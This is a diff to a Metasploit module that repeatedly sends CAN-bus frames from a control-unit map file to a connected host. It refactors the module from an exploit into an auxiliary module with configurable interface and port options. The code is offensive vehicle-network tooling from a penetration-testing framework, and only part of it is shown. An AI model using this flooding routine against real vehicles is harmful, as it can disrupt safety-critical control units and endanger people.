@@ -2,7 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-class MetasploitModule < Msf::Exploit::Remote
+class MetasploitModule < Msf::Auxiliary
   Rank = NormalRanking
 
   include Msf::Exploit::Remote::Tcp
@@ -19,31 +19,16 @@ class MetasploitModule < Msf::Exploit::Remote
       'License'        => MSF_LICENSE,
       'Platform'       => 'unix',
       'Arch'           => ARCH_CMD,
-      'Payload'        =>
-      {
-        'Space'       => 1024,
-        'DisableNops' => true,
-        'Compat'      =>
-        {
-          'PayloadType' => 'cmd',
-          'RequiredCmd' => 'generic ruby telnet'
-        }
-      },
-      'Targets'        =>
-      [
-        ['Automatic Target', {}]
-      ],
-      'DefaultTarget' => 0
       )
     )
-
     register_options([
-      Opt::RPORT(4444),
-      OptString.new('FILEMAP', [true, 'Path to FILEMAP', '/usr/share/metasploit-framework/data/wordlists/controlUnitMapCanBus.txt'])
+      OptInt.new('RPORT', [ true, 'The target port']),
+      OptString.new('INTERFACE', [true, 'Interface of CAN-Bus']),
+      OptString.new('FILEMAP', [true, 'Path to FILEMAP', ::File.join(Msf::Config.data_directory, 'wordlists', 'controlUnitMapCanBus.txt')])
     ])
   end
 
-  def exploit
+  def run
     connect
     print_status("Connected to #{rhost}:#{rport}...")
     print_status(' -- OPENING CONTROL UNIT MAP --')
@@ -57,7 +42,7 @@ class MetasploitModule < Msf::Exploit::Remote
     while 1
       lines.each_with_index{
         |e, i|
-        cmd = 'cansend vcan0 ' + "#{e}"
+        cmd = "cansend #{datastore['INTERFACE']} #{e}"
         sock.put(cmd)
       }
     end
